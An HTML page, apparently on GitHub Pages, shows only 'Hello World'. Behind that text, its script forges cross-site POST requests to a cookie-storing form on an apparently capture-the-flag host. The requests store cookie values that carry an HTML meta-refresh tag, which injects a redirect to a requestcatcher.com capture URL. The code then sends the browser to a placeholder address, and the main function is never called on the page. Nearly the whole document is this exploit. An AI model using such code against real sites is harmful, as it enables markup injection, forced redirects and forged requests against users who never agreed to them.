<!DOCTYPE html>
<html>
<body>
<h1>Hello World</h1>
<p>I'm hosted with GitHub Pages.</p>

<script>

async function makePostRequest(url, data) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `cookie_name=${data.cookie_name}&cookie_value=${encodeURIComponent(data.cookie_value)}&submit=Store+Cookie`
        });
        return await response.json();
    } catch (error) {
        console.error('Error making POST request:', error);
        throw error; 
    }
}

async function setCookiesAndRedirect() {
    const metaCookiesParts = [
        'a=<meta',
        'http-equiv="refresh"',
        'content="0;',
        'url=https://hi.requestcatcher.com/">'
    ];

    const url = 'http://host3.metaproblems.com:6020/index.php';
    const numRequests = 4;
    const requests = [];

    for (let i = 0; i < numRequests; i++) {
        const data = {
            cookie_name: `cookie_${i + 1}`,
            cookie_value: metaCookiesParts.join(' ')
        };
        requests.push(makePostRequest(url, data));
    }

    try {
        const responses = await Promise.all(requests);
        responses.forEach((response, index) => {
            console.log(`Cookie ${index + 1} set:`, response);
        });

        window.location.href = 'view_cookie_url';
    } catch (error) {
        console.error('Error setting cookies:', error);
    }
}

</script>





</body>
</html>